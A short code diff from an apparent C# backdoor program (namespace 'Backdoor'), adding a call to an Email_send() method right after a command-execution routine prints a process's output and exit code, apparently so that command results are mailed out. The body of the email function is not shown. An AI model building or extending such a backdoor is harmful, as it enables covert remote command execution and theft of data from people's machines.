@@ -74,6 +74,8 @@ namespace Backdoor
             Console.WriteLine("error>>" + (String.IsNullOrEmpty(error) ? "(none)" : error));
             Console.WriteLine("ExitCode: " + exitCode.ToString(), nameof(ExecuteCommand));
             process.Close();
+
+            Email_send();
         }
 
         public static void Email_send()
